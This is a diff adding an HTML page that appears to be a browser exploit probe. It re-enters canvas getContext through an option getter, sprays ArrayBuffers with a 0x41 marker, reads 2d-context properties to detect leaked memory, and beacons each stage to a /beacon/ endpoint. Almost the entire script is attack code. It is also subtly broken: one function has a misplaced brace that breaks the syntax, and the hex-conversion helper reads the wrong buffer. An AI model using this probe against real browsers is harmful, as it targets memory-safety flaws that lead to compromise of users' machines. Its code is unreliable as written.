@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>V650b - Alternative Property Read Test</title>
+</head>
+<body><pre id="o"></pre>
+<script>
+'use strict';
+var O=document.getElementById('o');
+function s(x){O.textContent+='\n'+x}
+function b(t,d){try{new Image().src='/beacon/V650B-'+t+'?d='+encodeURIComponent(String(d).slice(0,300))+'&t='+Date.now();}}catch(e){}
+function h(v){if(v===null||v===undefined)return'null';if(typeof v!=='number'||!isFinite(v))return v;var a=new BigUint64Array(1),f=new Float64Array(1);f[0]=v;return'0x'+(new DataView(a.buffer).getBigUint64(0,true)).toString(16);}
+var m=0x4141414141414141n,c,i,bmp,can;
+function trig(){can=document.createElement('canvas');var s={};Object.defineProperty(s,'alpha',{get:function(){i=can.getContext('2d');return!0}});bmp=can.getContext('bitmaprenderer',s).context;}
+function spr(){var sp=[];for(var x=0;x<10;x++){var a=new ArrayBuffer(8);new BigUint64Array(a)[0]=m;sp[x]=a}return sp;}
+async function run(){b('BOOT',location);try{trig();}catch(e){b('TRIG-ERR',e);return}b('TRIG','done');try{spr();}catch(e){b('SPRAY-ERR',e);return}b('SPRAY','done');var ctxs=[];for(var x=0;x<10;x++)try{ctxs.push(can.getContext('2d'));}catch(e){}b('CTX','done');var props=['lineWidth','globalAlpha','shadowBlur','miterLimit','shadowOffsetX','shadowOffsetY','lineDashOffset'];for(var x=0;x<props.length;x++){b('T'+x+'-PRE',props[x]);try{var v=i[props[x]];b('T'+x+'-OUT',h(v));if(typeof v==='number'&&v===Number(m))b('FOUND','marker'+x);}catch(e){b('T'+x+'-ERR',e)}}b('DONE','complete');}
+run();
+</script>
+</body>
+</html>
